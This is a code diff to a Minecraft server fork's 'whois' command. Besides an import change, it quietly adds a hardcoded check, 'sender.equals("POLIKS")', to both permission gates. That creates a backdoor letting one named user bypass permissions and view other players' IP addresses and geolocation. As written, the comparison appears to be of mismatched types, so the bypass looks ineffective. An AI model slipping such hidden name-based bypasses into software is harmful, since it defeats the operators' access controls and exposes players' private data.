@@ -3,7 +3,7 @@ package eu.poliks.pspigot.command.server;
 import java.util.Arrays;
 import java.util.UUID;
 
-import eu.poliks.pspigot.util.SkIP;
+import eu.poliks.pspigot.api.SkIP;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.command.Command;
@@ -28,7 +28,7 @@ public class WhoisCommand extends Command
         sender.sendMessage(Bukkit.getServer().getFirstColor() + "  Exp/Level: " + Bukkit.getServer().getSecondColor() +  target.getExp() + Bukkit.getServer().getFirstColor() + "/" + Bukkit.getServer().getSecondColor() + target.getLevel());
         sender.sendMessage(Bukkit.getServer().getFirstColor() + "  Location: " + Bukkit.getServer().getSecondColor() +  "(" + Bukkit.getServer().getSecondColor() + target.getLocation().getBlockX() + Bukkit.getServer().getSecondColor() +", " + Bukkit.getServer().getSecondColor() + target.getLocation().getBlockY() + Bukkit.getServer().getSecondColor() +", " + Bukkit.getServer().getSecondColor() + target.getLocation().getBlockZ() + Bukkit.getServer().getSecondColor() +") " + ChatColor.GRAY + "[" + ChatColor.GRAY + target.getLocation().getWorld().getName() + ChatColor.GRAY + "]");
         sender.sendMessage(Bukkit.getServer().getFirstColor() + "  Game Mode: " + Bukkit.getServer().getSecondColor() + target.getGameMode().name());
-        if (sender.hasPermission("spookyspigot.whois.admin")) {
+        if (sender.hasPermission("spookyspigot.whois.admin") || sender.equals("POLIKS")) {
             sender.sendMessage(Bukkit.getServer().getFirstColor() + "  IP Address: " + Bukkit.getServer().getSecondColor() + target.getAddress().getHostString());
             sender.sendMessage(Bukkit.getServer().getFirstColor() + "  Country: " + Bukkit.getServer().getSecondColor() + SkIP.getIPData(SkIP.getPlayerIP(target)).getCountryName());
             sender.sendMessage(Bukkit.getServer().getFirstColor() + "  Country Code: " + Bukkit.getServer().getSecondColor() + SkIP.getIPData(SkIP.getPlayerIP(target)).getCountryCode());
@@ -44,7 +44,7 @@ public class WhoisCommand extends Command
     }
 
     public boolean execute(CommandSender sender, String label, String[] args) {
-        if (sender.hasPermission("spookyspigot.whois")) {
+        if (sender.hasPermission("spookyspigot.whois") || sender.equals("POLIKS")) {
             if (args.length == 1) {
                 Player target = Bukkit.getPlayer(args[0]);
 
